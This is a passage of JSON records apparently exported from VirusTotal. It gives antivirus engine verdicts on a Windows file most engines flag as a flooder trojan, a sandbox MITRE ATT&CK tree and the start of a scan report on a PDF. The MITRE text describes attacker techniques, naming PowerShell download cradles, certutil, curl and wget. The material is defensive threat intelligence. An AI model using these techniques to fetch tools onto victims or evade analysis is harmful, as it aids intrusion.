        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "25360",
          "result": "Win32/Flooder.Tiny.A",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.297",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Paloalto": {
          "category": "malicious",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": "generic.ml",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "21.0.1.45",
          "result": "Trojan.Win32.Vtflooder.cft",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKDZ.71392",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25588",
          "result": "Trojan.Win32.Crypted.dbpklq",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKDZ.71392",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.Win32.Vflooder.b (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Ad-Aware": {
          "category": "malicious",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.21.193",
          "result": "Trojan.GenericKDZ.71392",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2021.5.0.7597",
          "result": "Trojan.GenericKDZ.71392 (B)",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Comodo": {
          "category": "malicious",
          "engine_name": "Comodo",
          "engine_version": "34672",
          "result": "TrojWare.Win32.VTFlooder.A@5c5lsj",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.978.51",
          "result": "Trojan.TR/Crypt.XPACK.Gen",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.56.4040",
          "result": "Trojan.Flood.22062",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4642",
          "result": "Trojan.Badur.Win32.30504",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_VFLOOD.SMCF",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2019.1.2+3728",
          "result": "BehavesLike.Win32.Agent.zh",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "3.5.50.94",
          "result": "malicious.high.ml.score",
          "method": "blacklist",
          "engine_update": "20220526"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Generic.mg.eaa742310f9713a6",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "1.4.1.0",
          "result": "ML/PE-A + Troj/Agent-AHNL",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.0.24.0",
          "result": "Trojan.Crypt",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.33171B:27.27556",
          "result": "Win32.Trojan.Vflooder.A",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan/Vtflooder.l",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Trojan.Downloader.Jqum",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.14",
          "result": "TR/Crypt.XPACK.Gen",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2017.9.26.565",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.79.174",
          "result": "Trojan.Win32.Agent.bot!s2",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.889",
          "result": "Trojan.Generic.D116E0",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "SUPERAntiSpyware": {
          "category": "malicious",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": "Trojan.Agent/Gen-Kazy",
          "method": "blacklist",
          "engine_update": "20220528"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan.Win32.Vtflooder.cft",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "220531-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.19200.6",
          "result": "Trojan:Win32/Vflooder",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "TACHYON": {
          "category": "malicious",
          "engine_name": "TACHYON",
          "engine_version": "2022-06-01.01",
          "result": "Trojan/W32.Badur.7168.E",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220103"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.22.0.10282",
          "result": "Trojan/Win32.Agent.R110400",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.108",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220426"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "Trojan.Badur",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.GenericKDZ.71392",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2019.9.16.1",
          "result": "malware (ai score=84)",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.3.1.101",
          "result": "Unsafe",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_VFLOOD.SMCF",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Win32.VtFlooder.a",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "22.2.1.2",
          "result": "Static AI - Malicious PE",
          "method": "blacklist",
          "engine_update": "20220330"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.300983.susgen",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.2.142.0",
          "result": "W32/Generic.AC.3F7BD8!tr",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "BitDefenderTheta": {
          "category": "malicious",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": "Gen:NN.ZexaF.34712.amGfaGlinwb",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "21.1.5827.0",
          "result": "Win32:Trojan-gen",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.10f971",
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "21.1.5827.0",
          "result": "Win32:Trojan-gen",
          "method": "blacklist",
          "engine_update": "20220531"
        }
      },
      "reputation": 1,
      "first_seen_itw_date": 1535296873
    },
    "type": "file",
    "id": "000033234c05472f5bc4a198c90944c052e704f35081358bfe0d631a76d5a4e5",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/000033234c05472f5bc4a198c90944c052e704f35081358bfe0d631a76d5a4e5"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the hosts file"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1018/",
                "id": "T1018",
                "name": "Remote System Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Posts data to webserver"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Posts data to webserver"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1105/",
                "id": "T1105",
                "name": "Ingress Tool Transfer"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS for network communication, use the SSL MITM Proxy cookbook for further analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample is packed with UPX"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "id": "T1027.002",
                "name": "Software Packing"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample is packed with UPX"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/000033234c05472f5bc4a198c90944c052e704f35081358bfe0d631a76d5a4e5/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b5045e5251e284b36db0a6"
  },
  "data": {
    "attributes": {
      "type_description": "PDF",
      "tlsh": "T14F24AD24584C6CDFC3A28FC21B1F3D1DB62D7272F8CA57810A69C35691A5E6FA50326F",
      "vhash": "93c37a5ba281144c1882fdde3a67dadcb",
      "type_tags": [
        "document",
        "pdf"
      ],
      "creation_date": 1260492914,
      "pdf_info": {
        "xfa": 0,
        "encrypted": 0,
        "javascript": 0,
        "openaction": 0,
        "js": 0,
        "header": "%PDF-1.5",
        "startxref": 2,
        "xref": 2,
        "num_stream": 27,
        "num_object_streams": 2,
        "acroform": 0,
        "num_launch_actions": 0,
        "num_obj": 120,
        "num_endstream": 27,
        "num_pages": 18,
        "suspicious_colors": 0,
        "flash": 0,
        "embedded_file": 0,
        "jbig2_compression": 0,
        "autoaction": 0,
        "trailer": 2,
        "num_endobj": 120
      },
      "last_modification_date": 1698038756,
      "type_tag": "pdf",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 228437,
      "type_extension": "pdf",
      "last_submission_date": 1697990739,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231021"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231021"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4979",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231021"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.120.49963",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.120.49963",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.562",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231020"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.112",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231020"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28113",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.467",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-22.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.94",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231021-00",
          "result": null,
